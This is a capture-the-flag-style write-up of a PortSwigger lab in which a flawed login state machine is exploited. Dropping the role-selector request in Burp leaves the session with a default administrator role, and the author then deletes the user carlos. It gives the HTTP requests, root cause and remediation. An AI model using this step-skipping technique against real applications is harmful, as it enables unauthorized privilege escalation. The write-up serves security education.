# PortSwigger Lab: Authentication bypass via flawed state machine

# TAGS: Business Logic, Authentication Bypass, State Machine, Burp Suite

Category: Business Logic
Date: October 27, 2026
Day: Tuesday
Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine
Published: Ready
Status: Done

---

## Intro

This lab is part of the Business Logic series. The flaw is a **flawed state machine** in the login process: after authenticating, the user is forced through a role-selection step. The problem is that the application never verifies that this step was completed — and when the role is unset, it falls back to **administrator**. So dropping the role-selection request logs you in as an admin.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says the application makes flawed assumptions about the sequence of events in the login process. The goal is to bypass authentication, access the admin interface and delete the user `carlos`. The lab provides the credentials **wiener:peter**.

I logged in and was redirected to a role-selection page instead of the home page:

```http
POST /login HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=YnarDvHgYakXVDEduMjOEOo033kEXRPW&username=wiener&password=peter
```

```http
HTTP/2 302 Found
Location: /role-selector
Set-Cookie: session=jcHGtquHzH8WsjNuuG3ck8qWBR25DQv5; Secure; HttpOnly; SameSite=None
```

The role selector is a simple form:

```http
GET /role-selector HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Cookie: session=jcHGtquHzH8WsjNuuG3ck8qWBR25DQv5
```

```html
<form class=login-form method=POST>
    <p>Please select a role</p>
    <select name=role>
        <option value='user'>User</option>
        <option value='content-author'>Content author</option>
    </select>
    <input required type="hidden" name="csrf" value="ayEBoYfZFc6xDA2WhfjN6uOMXtyqVf7a">
    <button class=button type=submit>Select</button>
</form>
```

Submitting it normally sends the chosen role and redirects home:

```http
POST /role-selector HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Cookie: session=jcHGtquHzH8WsjNuuG3ck8qWBR25DQv5
Content-Type: application/x-www-form-urlencoded

role=user&csrf=ayEBoYfZFc6xDA2WhfjN6uOMXtyqVf7a
```

```http
HTTP/2 302 Found
Location: /
```

Browsing straight to `/admin` from the role-selection page does **not** work — the role is still unset at that point.

---

## Exploitation:

#### Step 1: Log out and turn on interception

I logged out and went back to the login page. In Burp, I turned on **Proxy > Intercept** so I could hold every request.

#### Step 2: Forward the login and drop the role selector

I logged in again with `wiener:peter`. The first request is the login itself:

```http
POST /login HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=ZP7uWoRcu999kQbYLFALqJTNthZDah63&username=wiener&password=peter
```

I forwarded it. The next request in the queue was the role selector:

```http
GET /role-selector HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Cookie: session=jcHGtquHzH8WsjNuuG3ck8qWBR25DQv5
```

I **dropped** this request and let the browser continue to the home page.

#### Step 3: Access the admin panel and delete carlos

Because the role-selection step never ran, no role was ever written to the session — and the application's default role is **administrator**. I navigated to `/admin`:

```http
GET /admin HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Cookie: session=jcHGtquHzH8WsjNuuG3ck8qWBR25DQv5
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

Users
wiener - Delete
carlos - Delete
```

Then I deleted `carlos`:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0aa100d004d382e580fdcbe500c500c5.web-security-academy.net
Cookie: session=jcHGtquHzH8WsjNuuG3ck8qWBR25DQv5
```

```http
HTTP/2 302 Found
Location: /admin
```

The lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

The login process is a multi-step state machine: authenticate → select a role → reach the application. The role is only stored during the `/role-selector` step, but the application never verifies that this step was actually completed before granting access.

If the role-selection request is dropped, the session ends up with **no role**, and the application falls back to its default — **administrator**. In other words, skipping a mandatory step results in *more* privileges instead of less.

---

## Impact

An attacker with valid low-privileged credentials can bypass the role selection and become an administrator, gaining access to the admin interface and the ability to delete or modify users. In a real application, the same pattern could expose administrative functions, customer data and destructive actions — a full privilege escalation from a normal account.

---

## Remediation

To prevent this issue, applications should:

- **Fail closed**: deny access until the state machine is complete and a role is explicitly assigned;
- Never default to a privileged role — the safe default is the least-privileged role (or no access at all);
- Enforce each workflow step server-side and reject requests that skip steps;
- Store the workflow state server-side and associate it with the session, not with client input;
- Validate the selected role against an allow-list and apply least privilege.

---

## Key Takeaways

1. State machines must be enforced server-side — skipping a step must never grant more privileges.
2. **Dropping** a request is a valid attack: the application may fall back to an insecure default.
3. The default role must be the least privileged, never administrator.
4. Intercepting the login flow revealed the mandatory `/role-selector` step — dropping it was enough to become admin.

---

## References

- [PortSwigger — Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [PortSwigger — Authentication bypass via flawed state machine (lab)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
- [OWASP — Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
